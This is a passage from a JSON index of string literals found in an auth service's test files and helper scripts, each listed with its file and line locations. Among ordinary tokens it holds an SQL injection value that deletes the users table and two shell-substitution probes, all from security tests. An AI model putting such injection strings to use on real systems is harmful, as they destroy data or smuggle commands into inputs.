        "scripts/fix_test_batch.py:210"
      ]
    },
    "abc": {
      "value": "abc",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_validation.py:112"
      ]
    },
    "abc123": {
      "value": "abc123",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:192"
      ]
    },
    "abcdefghijklmnop": {
      "value": "abcdefghijklmnop",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:302"
      ]
    },
    "abstractmethod": {
      "value": "abstractmethod",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:211"
      ]
    },
    "access": {
      "value": "access",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_generation.py:85",
        "auth_service/tests/test_auth_token_generation.py:231",
        "auth_service/tests/test_auth_token_security.py:85",
        "auth_service/tests/test_auth_token_security.py:89",
        "auth_service/tests/test_auth_token_security.py:121",
        "auth_service/tests/test_auth_token_security.py:217",
        "auth_service/tests/test_auth_token_security.py:236",
        "auth_service/tests/test_auth_token_security.py:348",
        "auth_service/tests/test_auth_token_security.py:353",
        "auth_service/tests/test_auth_token_security.py:357"
      ]
    },
    "access-control-allow-origin": {
      "value": "access-control-allow-origin",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:117"
      ]
    },
    "access_": {
      "value": "access_",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_validation.py:101",
        "auth_service/tests/test_auth_token_validation.py:175",
        "auth_service/tests/test_auth_token_validation.py:252",
        "auth_service/tests/test_auth_token_validation.py:278"
      ]
    },
    "access_denied": {
      "value": "access_denied",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:118",
        "auth_service/tests/integration/test_auth_oauth_errors.py:123"
      ]
    },
    "access_token": {
      "value": "access_token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_base.py:109",
        "auth_service/tests/base/test_mixins.py:206",
        "auth_service/tests/base/test_mixins.py:248",
        "auth_service/tests/base/test_mixins.py:255",
        "auth_service/tests/base/test_mixins.py:260",
        "auth_service/tests/factories/token_factory.py:193",
        "auth_service/tests/factories/token_factory.py:218",
        "auth_service/tests/integration/test_auth_oauth_errors.py:45",
        "auth_service/tests/integration/test_auth_oauth_google.py:54",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:130"
      ]
    },
    "access_token_123": {
      "value": "access_token_123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_models.py:90",
        "auth_service/tests/unit/test_oauth_models.py:100"
      ]
    },
    "account_locked": {
      "value": "account_locked",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:24"
      ]
    },
    "account_unlocked": {
      "value": "account_unlocked",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:25"
      ]
    },
    "accounts.google.com": {
      "value": "accounts.google.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_google.py:103",
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:57"
      ]
    },
    "accounts.google.com/o/oauth2/v2/auth": {
      "value": "accounts.google.com/o/oauth2/v2/auth",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_flows_sync.py:41"
      ]
    },
    "across": {
      "value": "across",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:493"
      ]
    },
    "act": {
      "value": "act",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:39",
        "scripts/test_workflows_with_act.py:113",
        "scripts/test_workflows_with_act.py:152"
      ]
    },
    "act-event-": {
      "value": "act-event-",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:198"
      ]
    },
    "action": {
      "value": "action",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/permission_factory.py:59",
        "scripts/test_workflows_with_act.py:193"
      ]
    },
    "active": {
      "value": "active",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:244"
      ]
    },
    "actual_pass": {
      "value": "actual_pass",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:399",
        "auth_service/tests/test_staging_database_credentials.py:406"
      ]
    },
    "actual_value": {
      "value": "actual_value",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:634",
        "scripts/auto_fix_test_sizes.py:637",
        "scripts/auto_fix_test_sizes.py:653",
        "scripts/compliance/test_size_validator.py:479",
        "scripts/compliance/test_size_validator.py:488"
      ]
    },
    "add": {
      "value": "add",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:84"
      ]
    },
    "add_function": {
      "value": "add_function",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:45",
        "scripts/comprehensive_test_fixer.py:57",
        "scripts/comprehensive_test_fixer.py:317"
      ]
    },
    "admin": {
      "value": "admin",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/permission_factory.py:224",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1116",
        "auth_service/tests/test_auth_token_generation.py:45",
        "auth_service/tests/test_auth_token_security.py:110",
        "auth_service/tests/test_auth_token_security.py:215",
        "auth_service/tests/test_auth_token_security.py:373",
        "auth_service/tests/unified/test_jwt_validation.py:130"
      ]
    },
    "admin'; DELETE FROM auth_users; --": {
      "value": "admin'; DELETE FROM auth_users; --",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:85"
      ]
    },
    "admin:delete_users": {
      "value": "admin:delete_users",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/permission_factory.py:28"
      ]
    },
    "admin:read_users": {
      "value": "admin:read_users",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/permission_factory.py:26"
      ]
    },
    "admin:update_users": {
      "value": "admin:update_users",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/permission_factory.py:27"
      ]
    },
    "admin@netra.ai": {
      "value": "admin@netra.ai",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1117"
      ]
    },
    "administrative": {
      "value": "administrative",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:42"
      ]
    },
    "affected_services": {
      "value": "affected_services",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:28",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:35",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:42",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:49",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:465",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:474"
      ]
    },
    "after": {
      "value": "after",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:396"
      ]
    },
    "agent": {
      "value": "agent",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:52",
        "scripts/analyze_test_mocks.py:40",
        "scripts/auto_fix_test_sizes.py:354",
        "scripts/auto_fix_test_sizes.py:355",
        "scripts/auto_fix_test_violations.py:499",
        "scripts/auto_fix_test_violations.py:500",
        "scripts/test_backend.py:30",
        "scripts/unified_test_runner.py:412",
        "scripts/unified_test_runner.py:510"
      ]
    },
    "agent_completed": {
      "value": "agent_completed",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:411"
      ]
    },
    "agent_orchestration": {
      "value": "agent_orchestration",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:97",
        "scripts/business_value_test_index.py:422",
        "scripts/business_value_test_index.py:468",
        "scripts/business_value_test_index.py:491",
        "scripts/business_value_test_index.py:662",
        "scripts/business_value_test_index.py:705"
      ]
    },
    "agent_started": {
      "value": "agent_started",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:411"
      ]
    },
    "agents": {
      "value": "agents",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:172",
        "scripts/compliance/demo_test_size_enforcement.py:67",
        "scripts/test_backend_optimized.py:65",
        "scripts/test_staging_startup.py:84",
        "scripts/unified_test_config.py:62",
        "scripts/unified_test_config.py:64",
        "scripts/unified_test_config.py:68",
        "scripts/unified_test_config.py:115"
      ]
    },
    "agents/test_example_prompts_e2e_real.py": {
      "value": "agents/test_example_prompts_e2e_real.py",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:205"
      ]
    },
    "agent|supervisor|executor|chain": {
      "value": "agent|supervisor|executor|chain",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:97"
      ]
    },
    "aggressive": {
      "value": "aggressive",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:55",
        "scripts/test_backend_optimized.py:175",
        "scripts/test_backend_optimized.py:374"
      ]
    },
    "ai": {
      "value": "ai",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:354"
      ]
    },
    "alembic": {
      "value": "alembic",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:124",
        "scripts/test_staging_migrations.py:146",
        "scripts/test_staging_migrations.py:246",
        "scripts/test_staging_migrations.py:247",
        "scripts/test_staging_migrations.py:248"
      ]
    },
    "alembic.ini": {
      "value": "alembic.ini",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:105"
      ]
    },
    "alembic/alembic.ini": {
      "value": "alembic/alembic.ini",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:107"
      ]
    },
    "alg": {
      "value": "alg",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_security.py:194",
        "auth_service/tests/test_auth_token_security.py:211",
        "auth_service/tests/unified/test_jwt_validation.py:86",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:80",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:89",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:100",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:134",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:152",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:172",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:188"
      ]
    },
    "alignment_report.json": {
      "value": "alignment_report.json",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:415"
      ]
    },
    "all": {
      "value": "all",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:417",
        "scripts/business_value_test_index.py:459",
        "scripts/test_backend.py:364"
      ]
    },
    "all_passed": {
      "value": "all_passed",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:115"
      ]
    },
    "allergy_season": {
      "value": "allergy_season",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:41"
      ]
    },
    "allow_prod": {
      "value": "allow_prod",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:596"
      ]
    },
    "already exists in": {
      "value": "already exists in",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:192"
      ]
    },
    "already used": {
      "value": "already used",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:317"
      ]
    },
    "also_invalid!@#": {
      "value": "also_invalid!@#",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_token_refresh.py:109"
      ]
    },
    "alternative": {
      "value": "alternative",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:403"
      ]
    },
    "alternative_methods": {
      "value": "alternative_methods",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:407"
      ]
    },
    "analysis": {
      "value": "analysis",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:34"
      ]
    },
    "analytics": {
      "value": "analytics",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:100",
        "scripts/business_value_test_index.py:422",
        "scripts/business_value_test_index.py:471",
        "scripts/business_value_test_index.py:494"
      ]
    },
    "analytics|metrics|dashboard|reporting": {
      "value": "analytics|metrics|dashboard|reporting",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:100"
      ]
    },
    "analyze": {
      "value": "analyze",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:672",
        "scripts/compliance/test_refactor_helper.py:699"
      ]
    },
    "and": {
      "value": "and",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:345"
      ]
    },
    "anonymous": {
      "value": "anonymous",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:47"
      ]
    },
    "anthropic": {
      "value": "anthropic",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:40"
      ]
    },
    "api": {
      "value": "api",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:52",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:28",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:49",
        "scripts/auto_fix_test_sizes.py:344",
        "scripts/auto_fix_test_sizes.py:345",
        "scripts/auto_fix_test_violations.py:501",
        "scripts/auto_fix_test_violations.py:502",
        "scripts/autonomous_review/test_reviewer.py:225",
        "scripts/standardize_l3_test_names.py:205",
        "scripts/test_coordination_fixes.py:208"
      ]
    },
    "api_base": {
      "value": "api_base",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:131",
        "scripts/unified_test_config.py:139",
        "scripts/unified_test_config.py:147",
        "scripts/unified_test_config.py:155",
        "scripts/unified_test_config.py:312",
        "scripts/unified_test_config.py:313"
      ]
    },
    "api_key": {
      "value": "api_key",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_models.py:30",
        "auth_service/tests/utils/assertion_helpers.py:104",
        "scripts/test_config_loading.py:84",
        "scripts/test_staging_config.py:109"
      ]
    },
    "api_routes": {
      "value": "api_routes",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:44"
      ]
    },
    "api_url": {
      "value": "api_url",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:193",
        "scripts/test_cold_start_e2e.py:194",
        "scripts/test_cold_start_e2e.py:436",
        "scripts/test_cold_start_e2e.py:441"
      ]
    },
    "app": {
      "value": "app",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:91",
        "scripts/autonomous_review/test_reviewer.py:187",
        "scripts/autonomous_review/test_reviewer.py:310",
        "scripts/business_value_test_index.py:404",
        "scripts/compliance/demo_test_size_enforcement.py:28",
        "scripts/compliance/demo_test_size_enforcement.py:67",
        "scripts/compliance/demo_test_size_enforcement.py:68",
        "scripts/compliance/demo_test_size_enforcement.py:69",
        "scripts/compliance/demo_test_size_enforcement.py:142",
        "scripts/compliance/fake_test_scanner.py:55"
      ]
    },
    "app.": {
      "value": "app.",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:129",
        "scripts/comprehensive_test_fixer.py:225"
      ]
    },
    "app.config": {
      "value": "app.config",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_config.py:83",
        "scripts/test_staging_config.py:84"
      ]
    },
    "app.core.secret_manager": {
      "value": "app.core.secret_manager",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_config.py:85",
        "scripts/test_staging_config.py:86"
      ]
    },
    "app.main:app": {
      "value": "app.main:app",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:55"
      ]
    },
    "app/": {
      "value": "app/",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:233",
        "scripts/comprehensive_test_fixer.py:235"
      ]
    },
    "app/auth": {
      "value": "app/auth",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/factory_status/metrics_test_coverage.py:24",
        "netra_backend/app/services/factory_status/test_coverage_calculator.py:22"
      ]
    },
    "app/core": {
      "value": "app/core",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/factory_status/metrics_test_coverage.py:24",
        "netra_backend/app/services/factory_status/test_coverage_calculator.py:22"
      ]
    },
    "app/db": {
      "value": "app/db",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/factory_status/metrics_test_coverage.py:24",
        "netra_backend/app/services/factory_status/test_coverage_calculator.py:22"
      ]
    },
    "app/llm": {
      "value": "app/llm",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/factory_status/metrics_test_coverage.py:24",
        "netra_backend/app/services/factory_status/test_coverage_calculator.py:22"
      ]
    },
    "app/middleware/tool_permission_middleware.py": {
      "value": "app/middleware/tool_permission_middleware.py",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:78"
      ]
    },
    "app/pytest.ini": {
      "value": "app/pytest.ini",
      "category": "test_literals",
      "locations": [
        "scripts/fix_common_test_issues.py:13"
      ]
    },
    "app/routes/factory_compliance.py": {
      "value": "app/routes/factory_compliance.py",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:87"
      ]
    },
    "app/schemas/ToolPermission.py": {
      "value": "app/schemas/ToolPermission.py",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:113"
      ]
    },
    "app/services/factory_status/factory_status_integration.py": {
      "value": "app/services/factory_status/factory_status_integration.py",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:96"
      ]
    },
    "app/tests": {
      "value": "app/tests",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:123",
        "scripts/compliance/project_test_validator.py:60",
        "scripts/fix_test_syntax_errors.py:225"
      ]
    },
    "app/tests/**/*.py": {
      "value": "app/tests/**/*.py",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:54"
      ]
    },
    "app/tests/agents": {
      "value": "app/tests/agents",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:66",
        "scripts/test_failure_scanner.py:42"
      ]
    },
    "app/tests/core": {
      "value": "app/tests/core",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:54",
        "scripts/test_failure_scanner.py:38"
      ]
    },
    "app/tests/core/test_config_manager.py": {
      "value": "app/tests/core/test_config_manager.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_common_test_issues.py:32"
      ]
    },
    "app/tests/core/test_config_manager.py::TestConfigManager::test_initialization": {
      "value": "app/tests/core/test_config_manager.py::TestConfigManager::test_initialization",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:87"
      ]
    },
    "app/tests/core/test_error_handling.py::TestNetraExceptions::test_configuration_error": {
      "value": "app/tests/core/test_error_handling.py::TestNetraExceptions::test_configuration_error",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:86"
      ]
    },
    "app/tests/e2e": {
      "value": "app/tests/e2e",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:78"
      ]
    },
    "app/tests/integration": {
      "value": "app/tests/integration",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:60",
        "scripts/test_failure_scanner.py:45"
      ]
    },
    "app/tests/models": {
      "value": "app/tests/models",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:46"
      ]
    },
    "app/tests/performance": {
      "value": "app/tests/performance",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:72"
      ]
    },
    "app/tests/routes": {
      "value": "app/tests/routes",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:60",
        "scripts/test_failure_scanner.py:39"
      ]
    },
    "app/tests/routes/test_health_route.py": {
      "value": "app/tests/routes/test_health_route.py",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:85"
      ]
    },
    "app/tests/services": {
      "value": "app/tests/services",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:54",
        "scripts/test_failure_scanner.py:44"
      ]
    },
    "app/tests/services/agents/test_sub_agent.py::test_agent_node_is_coroutine": {
      "value": "app/tests/services/agents/test_sub_agent.py::test_agent_node_is_coroutine",
      "category": "test_literals",
      "locations": [
        "scripts/fix_common_test_issues.py:28"
      ]
    },
    "app/tests/services/agents/test_supervisor_service.py::test_supervisor_end_to_end": {
      "value": "app/tests/services/agents/test_supervisor_service.py::test_supervisor_end_to_end",
      "category": "test_literals",
      "locations": [
        "scripts/fix_common_test_issues.py:29"
      ]
    },
    "app/tests/services/agents/test_tools.py": {
      "value": "app/tests/services/agents/test_tools.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_common_test_issues.py:30"
      ]
    },
    "app/tests/services/apex_optimizer_agent/test_tool_builder.py": {
      "value": "app/tests/services/apex_optimizer_agent/test_tool_builder.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_common_test_issues.py:31"
      ]
    },
    "app/tests/services/database": {
      "value": "app/tests/services/database",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:41"
      ]
    },
    "app/tests/services/test_security_service.py": {
      "value": "app/tests/services/test_security_service.py",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:40"
      ]
    },
    "app/tests/test_agent_service_critical.py": {
      "value": "app/tests/test_agent_service_critical.py",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:96"
      ]
    },
    "app/tests/test_api_endpoints_critical.py": {
      "value": "app/tests/test_api_endpoints_critical.py",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:95"
      ]
    },
    "app/tests/unit": {
      "value": "app/tests/unit",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:54"
      ]
    },
    "app/tests/utils": {
      "value": "app/tests/utils",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:47"
      ]
    },
    "app/tests/websocket": {
      "value": "app/tests/websocket",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:43"
      ]
    },
    "app/websocket": {
      "value": "app/websocket",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/factory_status/metrics_test_coverage.py:25",
        "netra_backend/app/services/factory_status/test_coverage_calculator.py:23"
      ]
    },
    "application/json": {
      "value": "application/json",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:133",
        "auth_service/tests/test_security.py:287",
        "auth_service/tests/test_security.py:338",
        "auth_service/tests/test_security.py:366",
        "auth_service/tests/utils/test_client.py:24",
        "auth_service/tests/utils/test_client.py:25",
        "scripts/test_staging_deployment.py:130"
      ]
    },
    "applied": {
      "value": "applied",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:123"
      ]
    },
    "archive": {
      "value": "archive",
      "category": "test_literals",
      "locations": [
        "scripts/check_conftest_violations.py:23"
      ]
    },
    "are critical/high severity - immediate action required": {
      "value": "are critical/high severity - immediate action required",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:448"
      ]
    },
    "args": {
      "value": "args",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:155",
        "scripts/test_frontend_simple.py:78"
      ]
    },
    "args_kwargs_stub": {
      "value": "args_kwargs_stub",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:196"
      ]
    },
    "args_kwargs_stubs": {
      "value": "args_kwargs_stubs",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:61",
        "scripts/remove_test_stubs.py:188"
      ]
    },
    "assert": {
      "value": "assert",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:211",
        "scripts/analyze_test_overlap.py:215",
        "scripts/auto_fix_test_sizes.py:503",
        "scripts/auto_fix_test_violations.py:638",
        "scripts/compliance/test_fixer.py:280",
        "scripts/team_updates_test_analyzer.py:128"
      ]
    },
    "assert \\\\1": {
      "value": "assert \\\\1",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:250"
      ]
    },
    "assert \\\\1 != \\\\2": {
      "value": "assert \\\\1 != \\\\2",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:249"
      ]
    },
    "assert \\\\1 == \\\\2": {
      "value": "assert \\\\1 == \\\\2",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:248"
      ]
    },
    "assert \\\\1 is None": {
      "value": "assert \\\\1 is None",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:252"
      ]
    },
    "assert \\\\1 is not None": {
      "value": "assert \\\\1 is not None",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:253"
      ]
    },
    "assert not \\\\1": {
      "value": "assert not \\\\1",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:251"
      ]
    },
    "assertion": {
      "value": "assertion",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:162"
      ]
    },
    "assertion_similarity": {
      "value": "assertion_similarity",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:634"
      ]
    },
    "async": {
      "value": "async",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:569",
        "scripts/comprehensive_test_fixer.py:98",
        "scripts/comprehensive_test_fixer.py:108",
        "scripts/comprehensive_test_fixer.py:117",
        "scripts/comprehensive_test_fixer.py:126",
        "scripts/comprehensive_test_fixer.py:135",
        "scripts/comprehensive_test_fixer.py:144",
        "scripts/comprehensive_test_fixer.py:161",
        "scripts/comprehensive_test_fixer.py:252"
      ]
    },
    "async def": {
      "value": "async def",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:570",
        "scripts/comprehensive_test_fixer.py:153",
        "scripts/comprehensive_test_fixer.py:191",
        "scripts/comprehensive_test_fixer.py:248"
      ]
    },
    "async\\s+def\\s+\\w+\\([^)]*\\)\\s*:\\s*\\n\\s*\\.\\.\\.\\s*$": {
      "value": "async\\s+def\\s+\\w+\\([^)]*\\)\\s*:\\s*\\n\\s*\\.\\.\\.\\s*$",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:69"
      ]
    },
    "async\\s+def\\s+\\w+\\([^)]*\\)\\s*:\\s*\\n\\s*pass\\s*$": {
      "value": "async\\s+def\\s+\\w+\\([^)]*\\)\\s*:\\s*\\n\\s*pass\\s*$",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:67"
      ]
    },
    "async\\s+def\\s+\\w+\\(\\*args\\s*,\\s*\\*\\*kwargs\\)\\s*:\\s*\\n.*return\\s*\\{": {
      "value": "async\\s+def\\s+\\w+\\(\\*args\\s*,\\s*\\*\\*kwargs\\)\\s*:\\s*\\n.*return\\s*\\{",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:62"
      ]
    },
    "asyncio": {
      "value": "asyncio",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:533",
        "scripts/compliance/test_refactor_helper.py:131"
      ]
    },
    "asyncpg": {
      "value": "asyncpg",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_manager.py:28",
        "auth_service/tests/test_database_manager.py:51",
        "scripts/test_database_url_builder_comprehensive.py:125",
        "scripts/test_database_url_builder_comprehensive.py:169",
        "scripts/test_ssl_certificates_staging.py:175",
        "scripts/test_ssl_certificates_staging.py:245"
      ]
    },
    "asyncpg.connect": {
      "value": "asyncpg.connect",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:169"
      ]
    },
    "at line": {
      "value": "at line",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_syntax_errors.py:192"
      ]
    },
    "attempt_number": {
      "value": "attempt_number",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:94"
      ]
    },
    "attr": {
      "value": "attr",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:193",
        "scripts/analyze_test_overlap.py:213"
      ]
    },
    "aud": {
      "value": "aud",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1489",
        "auth_service/tests/test_auth_token_validation.py:100",
        "auth_service/tests/test_auth_token_validation.py:174",
        "auth_service/tests/test_auth_token_validation.py:251",
        "auth_service/tests/test_auth_token_validation.py:280",
        "auth_service/tests/test_oauth_id_token_validation.py:42",
        "auth_service/tests/unified/test_jwt_validation.py:159",
        "auth_service/tests/unified/test_jwt_validation.py:181",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:228"
      ]
    },
    "auth": {
      "value": "auth",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:44",
        "scripts/auto_fix_test_sizes.py:338",
        "scripts/auto_fix_test_sizes.py:339",
        "scripts/auto_fix_test_violations.py:493",
        "scripts/autonomous_review/test_reviewer.py:231",
        "scripts/standardize_l3_test_names.py:202",
        "scripts/start_test_services.py:107",
        "scripts/test_backend.py:32",
        "scripts/test_cold_start_e2e.py:284",
        "scripts/test_cold_start_e2e.py:391"
      ]
    },
    "auth failure": {
      "value": "auth failure",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:50",
        "auth_service/tests/test_database_connection_validation.py:53"
      ]
    },
    "auth-\t-service": {
      "value": "auth-\t-service",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:295"
      ]
    },
    "auth-$(echo hello": {
      "value": "auth-$(echo hello",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:293"
      ]
    },
    "auth-${USER": {
      "value": "auth-${USER",
      "category": "test_literals",
      "locations": [
